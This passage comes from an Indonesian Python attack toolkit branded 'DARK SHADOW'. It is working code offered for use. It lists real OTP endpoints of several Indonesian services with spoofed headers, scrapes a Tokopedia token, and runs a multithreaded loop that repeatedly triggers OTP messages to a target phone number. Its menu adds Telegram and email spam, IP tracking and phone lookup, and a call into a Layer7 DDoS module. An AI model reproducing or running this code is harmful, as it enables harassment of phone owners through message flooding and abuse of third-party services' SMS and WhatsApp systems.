            'Origin': 'https://www.pinhome.id'
        },
        'payload': lambda phone: {
            'accountType': 'customers',
            'applicationType': 'Pinhome Web',
            'countryCode': '62',
            'medium': 'whatsapp',
            'otpType': 'register',
            'phoneNumber': re.sub(r'^62|^0', '', phone)
        }
    },
    {
        'name': 'Tokopedia (WA)',
        'custom': True,
        'send': lambda phone: _send_tokopedia(phone)
    },
    {
        'name': 'Bunda',
        'url': 'https://cms.bunda.co.id/api/v1/auth/send-otp',
        'method': 'POST',
        'headers': {
            'Content-Type': 'application/json',
            'Origin': 'https://www.bunda.co.id',
            'Referer': 'https://www.bunda.co.id/id',
            'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
            'Accept': 'application/json, text/plain, */*',
            'Accept-Language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
            'Sec-Ch-Ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
            'Sec-Ch-Ua-Mobile': '?1',
            'Sec-Ch-Ua-Platform': '"Android"'
        },
        'payload': lambda phone: {
            'phone_number': '62' + phone[1:] if phone.startswith('0') else phone,
            'type': 'auth'
        }
    },
    {
        'name': 'Dokterin',
        'url': 'https://api.dokterin.id/user/v1/users/login',
        'method': 'POST',
        'headers': {
            'accept': '*/*',
            'accept-encoding': 'gzip, deflate, br, zstd',
            'accept-language': 'en-US,en;q=0.9,id;q=0.8,pt;q=0.7',
            'content-type': 'application/json',
            'origin': 'https://partner.dokterin.co.id',
            'referer': 'https://partner.dokterin.co.id/',
            'sec-ch-ua': '"Google Chrome";v="149", "Chromium";v="149", "Not)A;Brand";v="24"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36',
            'x-api-platform': 'eyJhcHBfdmVyc2lvbiI6IjEuMC4wIiwicGxhdGZvcm0iOiJ3ZWIiLCJtYW51ZmFjdHVyZXIiOiJCbGluayIsInByb2R1Y3QiOiJDaHJvbWUiLCJkZXNjcmlwdGlvbiI6IkNocm9tZSAxNDkuMC4wLjAgb24gV2luZG93cyAxMCA2NC1iaXQiLCJ0aW1lem9uZSI6IkFzaWEvSmFrYXJ0YSJ9',
            'x-session-id': '79fe686a1ffa7825ee8c8003be523a2b'
        },
        'payload': lambda phone: {
            'phone': '62' + phone[1:] if phone.startswith('0') else ('62' + phone if not phone.startswith('62') else phone),
            'tnc_accept': True,
            'device': 'Blink',
            'platform': 'web',
            'host': 'https://partner.dokterin.co.id'
        }
    },
    {
        'name': 'Bonus Belanja',
        'url': 'https://www.bonusbelanja.com/api/auth/registration/app',
        'method': 'POST',
        'headers': {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36',
            'Accept': '*/*',
            'Accept-Encoding': 'gzip, deflate, br, zstd',
            'Accept-Language': 'en-US,en;q=0.9,id;q=0.8,pt;q=0.7',
            'Content-Type': 'application/json',
            'Origin': 'https://www.bonusbelanja.com',
            'Referer': 'https://www.bonusbelanja.com/register/'
        },
        'payload': lambda phone: {
            'phone': '0' + phone[2:] if phone.startswith('62') else phone,
            'name': 'user' + str(hash(phone) % 10000).zfill(4),
            'agreeTnc': True,
            'agreeContact': True
        }
    },
    {
        'name': 'Adiraku',
        'url': 'https://prod.adiraku.co.id/ms-auth/auth/generate-otp-vdata',
        'method': 'POST',
        'headers': {
            'Content-Type': 'application/json; charset=utf-8',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36',
            'Origin': 'https://www.adiraku.co.id',
            'Referer': 'https://www.adiraku.co.id/'
        },
        'payload': lambda phone: {
            'mobileNumber': '0' + phone[2:] if phone.startswith('62') else ('0' + phone if not phone.startswith('0') else phone),
            'type': 'prospect-create',
            'channel': 'whatsapp'
        }
    },
    {
        'name': 'Paper.id',
        'url': 'https://register.paper.id/api/v1/auth/register/send-otp',
        'method': 'POST',
        'headers': {
            'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
            'X-Paper-User-Agent': 'Jupiter/7.17.24 mobile web (linux) Chrome 139',
            'Accept': 'application/json, text/plain, */*',
            'Content-Type': 'application/json',
            'Origin': 'https://www.paper.id',
            'Referer': 'https://www.paper.id/',
            'Url': 'https://www.paper.id/webappv1/register?disablemweb=1&utm_source=direct&utm_medium=direct&utm_campaign=',
            'Sec-Ch-Ua': '"Chromium";v="139", "Not;A-Brand";v="99"',
            'Sec-Ch-Ua-Mobile': '?1',
            'Sec-Ch-Ua-Platform': '"Android"',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-site'
        },
        'payload': lambda phone: {
            'phone': phone,
            'method': 'whatsapp',
            'registered_by': 'web'
        }
    },
    {
        'name': 'Duniagames',
        'url': 'https://api.duniagames.co.id/api/user/api/v2/user/send-otp',
        'method': 'POST',
        'headers': {
            'Accept': 'application/json, text/plain, */*',
            'Accept-Encoding': 'gzip, deflate, br',
            'Accept-Language': 'id',
            'Claim-Type': 'FR',
            'Content-Type': 'application/json',
            'Origin': 'https://duniagames.co.id',
            'Referer': 'https://duniagames.co.id/',
            'Sec-Ch-Ua': '"Chromium";v="139", "Not-A-Brand";v="99"',
            'Sec-Ch-Ua-Mobile': '?1',
            'Sec-Ch-Ua-Platform': '"Android"',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-site',
            'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
            'X-Device': 'fd283d16-f66f-431f-abdf-7ef32f5fe6d0'
        },
        'payload': lambda phone: {
            'phoneNumber': '+' + re.sub(r'\D', '', phone),
            'userName': re.sub(r'\D', '', phone)
        }
    }
]

def _send_tokopedia(phone):
    try:
        get_url = f'https://accounts.tokopedia.com/otp/c/page?otp_type=116&msisdn={phone}&ld=https%3A%2F%2Faccounts.tokopedia.com%2Fregister%3Ftype%3Dphone%26phone%3D{phone}%26status%3DeyJrIjp0cnVlLCJtIjp0cnVlLCJzIjpmYWxzZSwiYm90IjpmYWxzZSwiZ2MiOmZhbHNlfQ%253D%253D'
        headers = {
            'User-Agent': 'Mozilla/5.0 (Linux; Android 5.1.1; SM-G600S Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/59.0.3071.125 Mobile Safari/537.36',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'Origin': 'https://accounts.tokopedia.com',
            'Accept': 'application/json, text/javascript, */*; q=0.01',
            'X-Requested-With': 'XMLHttpRequest',
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'
        }
        get_res = requests.get(get_url, headers=headers, timeout=10)
        token_match = re.search(r'<input\s+id="Token"\s+value="([^"]+)"\s+type="hidden"\s*/?>', get_res.text)
        if not token_match:
            return {'success': False, 'status': 0, 'error': 'Token tidak ditemukan'}
        tk = token_match.group(1)
        post_url = 'https://accounts.tokopedia.com/otp/c/ajax/request-wa'
        data = {
            'otp_type': '116',
            'msisdn': phone,
            'tk': tk,
            'email': '',
            'original_param': '',
            'user_id': '',
            'signature': '',
            'number_otp_digit': '6'
        }
        post_res = requests.post(post_url, data=data, headers=headers, timeout=10)
        return {'success': post_res.status_code == 200, 'status': post_res.status_code}
    except Exception as e:
        return {'success': False, 'status': 0, 'error': str(e)}

def send_otp(platform, phone):
    if platform.get('custom', False):
        return platform['send'](phone)

    payload = platform['payload'](phone)
    headers = platform['headers']
    url = platform['url']
    method = platform.get('method', 'POST')

    try:
        if method.upper() == 'POST':
            content_type = headers.get('Content-Type', 'application/json')
            if 'text/plain' in content_type:
                response = requests.post(url, data=json.dumps(payload), headers=headers, timeout=15)
            else:
                response = requests.post(url, json=payload, headers=headers, timeout=15)
        else:
            response = requests.get(url, params=payload, headers=headers, timeout=15)
        return {'success': response.status_code in [200, 201, 202], 'status': response.status_code}
    except Exception as e:
        return {'success': False, 'status': 0, 'error': str(e)}

def otp_spam(phone):
    print(PUTIH + f"\n[+] Memulai OTP STRIKE ke {phone}" + RESET)
    print(PUTIH + "[*] Proses berjalan di latar belakang. Tekan Ctrl+C untuk berhenti." + RESET)
    print()

    while True:
        try:
            with ThreadPoolExecutor(max_workers=20) as executor:
                futures = [executor.submit(send_otp, platform, phone) for platform in OTP_PLATFORMS]
                for future in as_completed(futures):
                    try:
                        future.result()
                    except Exception:
                        pass
            print(PUTIH + "[+] OTP STRIKE selesai. Menunggu 2 menit... (Ctrl+C untuk berhenti)" + RESET)
            for _ in range(24):
                time.sleep(5)
        except KeyboardInterrupt:
            print(MERAH + "\n[!] OTP STRIKE dihentikan oleh user." + RESET)
            break
        except Exception:
            time.sleep(120)


def panggil_layer7():
    try:
        # Import modul Layer7DDOS dari folder Layer7
        sys.path.insert(0, os.path.join(os.path.dirname(__file__), 'Layer7'))
        import Layer7DDOS
        Title("Layer7 DDOS")
        Layer7DDOS.Main()   # <--- Ini panggilan yang TUAN minta
        Continue()
        a()  # Kembali ke menu utama
    except ImportError as e:
        print(f"[!] Gagal import Layer7DDOS: {e}")
        print("[!] Pastikan file Layer7DDOS.py ada di folder ./Layer7/")
        Continue()
        a()

# ==================== GANTI WARNA ====================
def ganti_warna():
    print(PUTIH + "\n[+] Ganti Warna DARK SHADOW" + RESET)
    print("  01. Merah")
    print("  02. Hijau")
    print("  03. Kuning")
    print("  04. Biru")
    print("  05. Ungu")
    print("  06. Cyan")
    print("  07. Putih")
    pilihan = input(PUTIH + "Pilih (1-7): " + RESET).strip()
    warna_map = {
        '1': 'merah',
        '2': 'hijau',
        '3': 'kuning',
        '4': 'biru',
        '5': 'ungu',
        '6': 'cyan',
        '7': 'putih'
    }
    if pilihan in warna_map:
        set_warna(warna_map[pilihan])
        print(PUTIH + f"[+] Warna diubah menjadi {warna_map[pilihan].upper()}." + RESET)
    else:
        print(MERAH + "[!] Pilihan tidak valid." + RESET)
    time.sleep(1)

# ==================== MAIN ====================
def main():
    if not is_device_allowed():
        print(MERAH + "\n[!] AKSES DITOLAK" + RESET)
        print(PUTIH + "[!] Device ID Anda: " + get_device_id() + RESET)
        print(PUTIH + "[!] ID ini harus dikirimkan ke admin." + RESET)
        sys.exit(1)

    # Definisikan variabel warna di dalam main
    a = KUNING
    k = PUTIH
    p = PUTIH
    h = HIJAU
    m = MERAH

    while True:
        clear_screen()
        show_banner()

        print(f"""{a}╭──────────────────────── {m}[{p} M E N U {m}]{a} ─────────────────────────╮
│                                                              │
│ {p}[{k} 01 {p}] SPAM OTP                                              {a}│
│ {p}[{k} 02 {p}] SPAM BOT TELEGRAM                                     {a}│
│ {p}[{k} 03 {p}] SPAM EMAIL                                            {a}│
│ {p}[{k} 04 {p}] IP TRACKER                                            {a}│
│ {p}[{k} 05 {p}] PHONE INFO                                            {a}│
│ {p}[{k} 06 {p}] GANTI WARNA                                           {a}│
│ {p}[{k} 00 {p}] KELUAR                                                {a}│
│                                                              │
╰── ╭─ {m}[{p} P I L I H {m}]{a} ──────────────────────────────────────────╯""")

        pilihan = input(f"    {a}╰──{h}➤{p} ").strip()

        if pilihan in ["01", "1"]:
            phone_input = input(
                PUTIH + "  Masukkan nomor target (contoh: 08123456789): " + RESET
            ).strip()

            phone_digits = re.sub(r"\D", "", phone_input)

            if not phone_digits:
                print(MERAH + "[!] Nomor tidak valid." + RESET)
                time.sleep(1)
                continue

            if phone_digits.startswith("0"):
                phone = "62" + phone_digits[1:]
            elif phone_digits.startswith("62"):
                phone = phone_digits
            else:
                phone = "62" + phone_digits
            log_activity("SPAM OTP", f"Nomor: {phone}")
            otp_spam(phone)
            
        elif pilihan in ["02", "2"]:
            
            telegram_spam()
            
        elif pilihan in ["03", "3"]:
            
            gmail_spam()
            
        elif pilihan in ["04", "4"]:
            
            ip_tracker()
            
        elif pilihan in ["05", "5"]:
            
            phone_info_menu()
            
        elif pilihan in ["06", "6"]:
            
            ganti_warna()
        elif pilihan in ["00", "0"]:
            print(HIJAU + "\n[+] Sesi dihentikan. Sampai jumpa!" + RESET)
            break
        
            
        else:
            print(MERAH + "[!] Pilihan tidak valid." + RESET)
            time.sleep(1)

if __name__ == "__main__":
    main()
